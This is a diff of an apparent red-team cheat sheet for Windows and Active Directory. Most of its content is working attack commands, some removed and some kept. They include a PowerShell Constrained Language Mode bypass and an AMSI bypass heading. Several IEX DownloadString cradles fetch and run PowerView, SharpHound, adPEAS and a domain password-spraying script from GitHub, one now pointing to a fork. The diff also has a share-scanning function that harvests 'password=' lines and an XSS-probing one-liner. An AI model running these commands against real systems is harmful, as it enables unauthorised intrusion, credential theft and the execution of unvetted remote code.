@@ -1,20 +1,5 @@
 ### Bypasses
 ------------
-##### Powershell CLM Bypass:
-~~~
-$CurrTemp = $env:temp
-$CurrTmp = $env:tmp
-$TEMPBypassPath = "C:\windows\temp"
-$TMPBypassPath = "C:\windows\temp"
-Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
-Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"
-Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe  -ExecutionPolicy bypass"
-sleep 5
-#Set it back
-Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
-Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
-~~~
-
 ##### AMSI Bypass:
 ~~~
 $a = [Ref].Assembly.GetTypes()
@@ -64,40 +49,16 @@ IEX (New-Object Net.Webclient).DownloadString('https://gist.githubusercontent.co
 
 ### Scripts - In Memory
 -----------------------
-#### Host Recon
-~~~
-IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1');
-Invoke-HostRecon
-~~~
-
-#### ConvertTo-PowerShell
-~~~
-IEX (New-Object Net.Webclient).DownloadString('https://github.com/cfalta/PowerShellArmoury/raw/2d9bea5e1c10353186fe75ebc28c5e596247dca3/utilities/ConvertTo-Powershell.ps1');
-~~~
-
-##### Powerview
-~~~
-IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
-~~~
 
 ##### Spray
 ~~~
-IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/DomainPasswordSpray/master/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Domain <domain> -Password password
-~~~
-##### Sharphound
-~~~
-IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -Domain <domain> -CollectionMethod All
+IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/pocahon/DomainPasswordSpray/master/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Domain <domain> -Password password
 ~~~
 ##### Safe SSL/TLS-Channel
 ~~~
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [
 Net.SecurityProtocolType]::Ssl2 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.Se
 curityProtocolType]::Tls12
-~~~
-##### BloodHound collector (adPEAS)
-~~~
-IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/6110
-6960/adPEAS/main/adPEAS.ps1'); Invoke-adPEAS -Module Bloodhound -Scope All
 ~~~
 ##### Check PATH of host and permissions on each folder in PATH (PowerShell function)
 ~~~
@@ -130,94 +91,3 @@ Invoke-PathCheck -AccesschkPath "C:\Path\to\accesschk64.exe"
 ~~~
 $Env:Path -split ";" | ForEach-Object { $_ }
 ~~~
-##### Invoke-PasswordSearch
-~~~
-function Invoke-PasswordSearch {
-    param (
-        [Parameter(Mandatory=$true)]
-        [string]$SharesFilePath
-    )
-
-    # Lees alle paden uit het tekstbestand
-    $paths = Get-Content -Path $SharesFilePath
-
-    $results = @()
-
-    foreach ($path in $paths) {
-        # Controleer of het pad niet leeg is
-        if (![string]::IsNullOrWhiteSpace($path)) {
-            Write-Host "Processing path: $path"
-            try {
-                $matches = Get-ChildItem -Path $path -Recurse -File | Select-String "password="
-                $results += $matches | ForEach-Object {
-                    [PSCustomObject]@{
-                        Path       = $_.Path
-                        Line       = $_.Line
-                        LineNumber = $_.LineNumber
-                    }
-                }
-            } catch {
-                Write-Host "Failed to process path: $path"
-            }
-        }
-    }
-
-    # Retourneer de resultaten
-    return $results
-}
-
-# Voorbeeld van het aanroepen van de functie en het opslaan van de resultaten in een variabele
-# $searchResults = Invoke-PasswordSearch -SharesFilePath "C:\path\to\shares.txt"
-~~~~
-XSS line
-~~~~
-echo target.com | subfinder -silent | katana -silent | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m Vulnerable"; done
-~~~~
-Visualize.py
-~~~~
-import json
-import argparse
-from pyvis.network import Network
-
-# Set up argument parser
-parser = argparse.ArgumentParser(description='Visualize network data from a JSON file.')
-parser.add_argument('-f', '--file', required=True, help='Path to the JSON file to visualize.')
-args = parser.parse_args()
-
-# Load JSON data from the specified file
-with open(args.file, 'r') as f:
-    data = [json.loads(line) for line in f]
-
-# Initialize a PyVis Network with local resources
-net = Network(height='750px', width='100%', notebook=True, cdn_resources='local')
-
-# Add nodes and edges to the network
-for item in data:
-    # Create a node for the URL
-    url_node = item['url']
-    net.add_node(url_node, title=url_node)
-
-    # Create nodes for IP addresses
-    for ip in item['a']:
-        net.add_node(ip, title=ip)
-        net.add_edge(url_node, ip)
-
-    # Create nodes for status codes and titles
-    status_node = f"Status: {item['status_code']}"
-    net.add_node(status_node, title=status_node)
-    net.add_edge(url_node, status_node)
-
-    if 'title' in item:
-        title_node = item['title']
-        net.add_node(title_node, title=title_node)
-        net.add_edge(url_node, title_node)
-
-# Set the physics of the network
-net.force_atlas_2based()
-
-# Save and show the network
-net.show('network_visualization.html')
-
-
-
-
